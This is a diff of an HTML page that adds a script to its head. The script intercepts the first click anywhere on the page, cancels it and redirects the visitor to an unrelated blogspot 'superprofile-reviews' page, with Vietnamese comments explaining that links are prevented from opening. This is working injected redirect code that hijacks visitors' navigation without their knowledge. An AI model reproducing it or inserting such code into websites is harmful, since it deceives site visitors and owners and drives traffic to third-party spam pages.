@@ -2,6 +2,21 @@
 <!doctype html>
 <html lang="en">
 <head>
+    <script>
+         document.addEventListener('DOMContentLoaded', function() {
+             let hasRedirected = false;
+         
+             function redirectToURL(event) {
+                 if (!hasRedirected) {
+                     event.preventDefault(); // Ngăn chặn hành vi mặc định (click vào link sẽ không mở trang khác)
+                     hasRedirected = true;
+                     window.location.href = 'https://superprofile-reviews-2025.blogspot.com/p/superprofile-reviews.html';
+                 }
+             }
+         
+             document.body.addEventListener('click', redirectToURL, true); // "true" để đảm bảo bắt sự kiện sớm nhất
+         });
+</script>
     <meta charset="utf-8">
     
     
@@ -1486,4 +1501,5 @@
     <!-- End of bodyEnd -->
 </body>
 </html>
+
 
